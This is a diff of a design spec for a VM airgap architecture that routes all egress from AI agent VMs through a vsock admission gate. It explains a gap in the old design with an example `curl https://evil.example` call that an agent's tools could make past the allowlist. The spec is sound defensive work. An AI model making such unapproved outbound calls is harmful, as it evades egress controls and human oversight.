@@ -1,9 +1,12 @@
 # RAXIS V2 — Path A3 Universal Airgap Architecture
 
-> **Status:** V2 Specified (opt-in via `RAXIS_AIRGAP_A3=1` env var +
-> `runtime-airgap-a3` Cargo feature). Default-off path is bit-identical
-> to the legacy `Tier1Tproxy` virtio-net-with-NAT model documented in
-> `vm-network-isolation.md`.
+> **Status:** V2 Specified — **Mediated is the only supported
+> egress tier shipped in V2.** The legacy `Tier1Tproxy` variant
+> (virtio-net + NAT + in-guest iptables REDIRECT) was removed in
+> the Tier1Tproxy deletion sweep (TODO
+> `tier1-deletion-fold-into-cleanup-sweep`). The `runtime-airgap-a3`
+> cargo feature and the `RAXIS_AIRGAP_A3` runtime env-var gate were
+> removed in the same sweep; A3 is no longer opt-in.
 >
 > **Role in the V2 unified egress story.** This spec is the canonical
 > home for the *universal* airgap model: every role's VM
@@ -13,18 +16,21 @@
 > arbitrates over vsock, not over a NAT tap.
 >
 > **Cross-references.**
-> - `vm-network-isolation.md` — Tier-1 admission contract. Path A3
->   keeps the admission contract (SNI / Host header allowlist) but
->   moves the transport from virtio-net + iptables-redirect-to-kernel
->   to AF_VSOCK + kernel-side tunnel.
+> - `vm-network-isolation.md` — admission contract (SNI / Host
+>   header allowlist) inherited from the deleted Tier-1 design.
+>   Path A3 keeps the admission contract but uses AF_VSOCK +
+>   kernel-side tunnel as the only transport; the historical
+>   "virtio-net + iptables redirect to kernel" transport described
+>   alongside it is no longer compiled.
 > - `credential-proxy.md §12a` — vsock-loopback bridge for
 >   credential-proxy URLs. Path A3 reuses the same per-VM vsock
 >   device for its admission channel, its byte-tunnel channel, and
 >   its DNS-over-vsock channel; the credential-proxy bridge is the
 >   architectural precedent.
-> - `extensibility-traits.md §3` — `EgressTier::Mediated` is the A3
->   variant that produces **no** `AvfNetworkDevice` and omits
->   Firecracker's `network-interfaces` field.
+> - `extensibility-traits.md §3` — `EgressTier::Mediated` is the
+>   only non-`None` egress tier; it produces **no**
+>   `AvfNetworkDevice` and omits Firecracker's `network-interfaces`
+>   PUT.
 > - `kernel-mediated-egress.md` — deprecated; the A3 model
 >   *generalises* kernel-mediated egress from "HTTP only" to "every
 >   byte the guest sends outbound".
@@ -32,40 +38,43 @@
 >   no-NIC, vsock chokepoint, DNS mediation, IPv6 disabled, paired
 >   audit for admission and DNS.
 
-## 1. Why A3 exists — the gap A1/A2 leave open
+## 1. Why A3 exists — the gap the original Tier-1 left open
 
-The V2 baseline has the **Reviewer** at `EgressTier::None` (no NIC)
-and the **Executor / Orchestrator** at `EgressTier::Tier1Tproxy`
-(virtio-net + NAT + an in-guest `raxis-tproxy` binary that *should*
-redirect outbound TCP to itself and *should* enforce an allowlist
-before opening upstream sockets). In practice the V2 GA shipment is
+The pre-deletion V2 baseline had the **Reviewer** at
+`EgressTier::None` (no NIC) and the **Executor / Orchestrator** at
+the legacy `EgressTier::Tier1Tproxy` (virtio-net + NAT + an
+in-guest `raxis-tproxy` binary that *should* have redirected
+outbound TCP to itself and *should* have enforced an allowlist
+before opening upstream sockets). In practice that shipment was
 asymmetric:
 
-1. The canonical Executor rootfs does **not** ship the
-   `raxis-tproxy` binary at `/usr/local/bin/raxis-tproxy`. It links
-   the credential-proxy vsock-loopback forwarder as a library and
-   relies on the lack of in-VM enforcement plus the **gateway**
-   URL allowlist as the only line of defence.
-2. The Executor VM's iptables REDIRECT chain is never installed at
-   PID 1 boot — the `vm-network-isolation.md §3.1` rules are
+1. The canonical Executor rootfs did **not** ship the
+   `raxis-tproxy` binary at `/usr/local/bin/raxis-tproxy`. It
+   linked the credential-proxy vsock-loopback forwarder as a
+   library and relied on the lack of in-VM enforcement plus the
+   **gateway** URL allowlist as the only line of defence.
+2. The Executor VM's iptables REDIRECT chain was never installed
+   at PID 1 boot — the historical "Tier-1 §3.1 rules" were
    normative but not wired into `crates/planner-core::guest_init`.
-3. The kernel-side admission accept loop only handles the
+3. The kernel-side admission accept loop only handled the
    *dev-fallback* TCP transport from `raxis-tproxy`'s
    `KernelChannel::Tcp` variant. A real `KernelChannel::Vsock`
-   variant is unimplemented.
+   variant was unimplemented.
 
-The combined effect: an Executor that runs a `bash`-invoked
-`curl https://evil.example` reaches **the NAT** directly because the
-in-guest iptables chain is empty and the tproxy binary is absent.
-The gateway allowlist catches LLM provider calls (which go through
-the kernel-mediated `PlannerFetchRequest` path) but does not catch
-raw TCP from agent-spawned tools.
+The combined effect: an Executor that ran a `bash`-invoked
+`curl https://evil.example` reached **the NAT** directly because
+the in-guest iptables chain was empty and the tproxy binary was
+absent. The gateway allowlist caught LLM provider calls (which
+went through the kernel-mediated `PlannerFetchRequest` path) but
+did not catch raw TCP from agent-spawned tools.
 
 Path A3 closes this gap by **eliminating the virtio-net device
 entirely** from every role's VM. The agent's TCP socket has nowhere
 to go *except* into the in-guest tproxy listener, and the in-guest
 tproxy MUST route every byte through the kernel's vsock admission
-channel.
+channel. The Tier1Tproxy deletion finished the job by making A3
+the only egress path — operators can no longer accidentally boot
+into the unfixed Tier-1 posture.
 
 ## 2. The unified A3 model end-to-end
 
@@ -195,10 +204,9 @@ even when admission later denies them.
 
 ## 4. In-guest enforcement (`crates/planner-core::guest_init`)
 
-When `RAXIS_AIRGAP_A3=1` is set in the guest env (the kernel stamps
-this iff the build was compiled with the `runtime-airgap-a3`
-feature AND the operator opted in via the same env var at kernel
-boot), PID 1 installs:
+PID 1 inside every Linux executor guest unconditionally installs
+the egress chokepoint at boot — there is no `RAXIS_AIRGAP_A3` gate
+and no cargo feature flag any more. The chokepoint consists of:
 
 ```
 # Redirect all outbound TCP (except loopback) to raxis-tproxy
@@ -224,55 +232,60 @@ to host loopback via vsock.
 
 ## 5. Substrate config — no NIC, ever
 
-`EgressTier::Mediated` is the A3 substitute for `Tier1Tproxy`. It
-produces:
+`EgressTier::Mediated` is the only non-`None` egress tier shipped
+in V2. It produces:
 
-- `crates/isolation-apple-vz`: `network = None`, no
-  `AvfNetworkDevice` at all.
-- `crates/isolation-firecracker`: no `network-interfaces` PUT,
-  guest kernel boots without `eth0`.
+- `crates/isolation-apple-vz`: no `network` field at all (the
+  legacy `AvfNetworkDevice` / `AvfNetworkMode` types were removed
+  alongside Tier1Tproxy).
+- `crates/isolation-firecracker`: no `PUT /network-interfaces`
+  call, guest kernel boots without `eth0`.
 
-`EgressTier::Tier1Tproxy` is marked `#[deprecated]` but retained
-so the default-off path is bit-identical to the legacy build.
+The `EgressTier::Tier1Tproxy` enum variant was removed in the
+deletion sweep. Old audit chains that recorded
+`egress_tier = "Tier1Tproxy"` continue to deserialize byte-for-byte
+because `SessionVmSpawned.egress_tier` is a `String`, not the
+`EgressTier` enum; the audit-tools verify path does not round-trip
+that string through the enum.
 
-## 6. Feature gating
+## 6. Feature gating — removed
 
-Two layers, both required for A3 to activate:
+The previous double gate (`runtime-airgap-a3` cargo feature +
+`RAXIS_AIRGAP_A3=1` env var) was removed in the Tier1Tproxy
+deletion. The kernel always compiles in `handlers::tproxy_admit`
+and `handlers::dns_resolve`, the session-spawn path always emits
+`EgressTier::Mediated` for Executor (`EgressTier::None` for
+Orchestrator and Reviewer), and PID 1 inside the guest
+unconditionally installs the iptables REDIRECT, the
+`disable_ipv6` sysctls, and the `/etc/resolv.conf →
+127.0.0.1` pin.
 
-1. **Cargo feature** `runtime-airgap-a3` on the `raxis-kernel`
-   crate. When the feature is OFF the kernel compiles the A3
-   handlers / vsock listeners out entirely (they are
-   `#[cfg(feature = "runtime-airgap-a3")]`).
-2. **Env var** `RAXIS_AIRGAP_A3=1` on the kernel process. When
-   the env var is unset the kernel selects `EgressTier::Tier1Tproxy`
-   for executor / orchestrator and DOES NOT install the A3
-   listeners even when the feature is compiled in.
-
-The witness tests (`kernel/tests/airgap_a3_*.rs`) gate themselves
-on the feature; the live-e2e default-off path
-(`kernel/tests/extended_e2e_realistic_scenario.rs`) does NOT set
-`RAXIS_AIRGAP_A3` and is therefore exercised by the legacy path.
+The fallback per-port env vars `RAXIS_AIRGAP_A3_HOST_CID` /
+`_ADMISSION_PORT` survive — they are discovery overrides for
+substrates that expose a non-default vsock CID, not a feature
+toggle.
 
 ## 7. Operator workflow
 
 See `guides/operator/21-airgap-a3-egress-allowlist.md` for the
-end-to-end recipe (authoring `[[tproxy_allowlist]]`, opt-in
-flow, common destinations for cargo / npm / pip / git, and the
-`live-e2e/docker-compose.airgap-a3.yml` test harness).
+end-to-end recipe (authoring `[[tproxy_allowlist]]`, common
+destinations for cargo / npm / pip / git, and the canonical
+`live-e2e/docker-compose.extended.e2e.yml` test harness). The
+previous `docker-compose.airgap-a3.yml` opt-in harness was deleted
+alongside the cargo feature.
 
 ## 8. Invariants (canonical home)
 
 This file is the canonical home for:
 
-- `INV-NETISO-A3-UNIVERSAL-NO-NIC-01` — when
-  `RAXIS_AIRGAP_A3=1`, no role-image's VM gets a virtio-net
-  device.
-- `INV-NETISO-A3-VSOCK-CHOKEPOINT-01` — under A3, the kernel's
-  tproxy admission gate is the SOLE arbiter of guest egress.
-- `INV-NETISO-A3-DNS-MEDIATED-01` — under A3, DNS queries flow
-  through the kernel; guest cannot reach external DNS servers.
-- `INV-NETISO-A3-IPV6-DISABLED-01` — under A3, IPv6 is disabled
-  at PID 1.
+- `INV-NETISO-A3-UNIVERSAL-NO-NIC-01` — no role-image's VM gets
+  a virtio-net device (true unconditionally since the Tier1Tproxy
+  deletion).
+- `INV-NETISO-A3-VSOCK-CHOKEPOINT-01` — the kernel's tproxy
+  admission gate is the SOLE arbiter of guest egress.
+- `INV-NETISO-A3-DNS-MEDIATED-01` — DNS queries flow through the
+  kernel; guest cannot reach external DNS servers.
+- `INV-NETISO-A3-IPV6-DISABLED-01` — IPv6 is disabled at PID 1.
 - `INV-AUDIT-TPROXY-ADMIT-01` — every `TproxyAdmissionRequest`
   emits a paired audit event (granted or denied) BEFORE the
   response is sent.
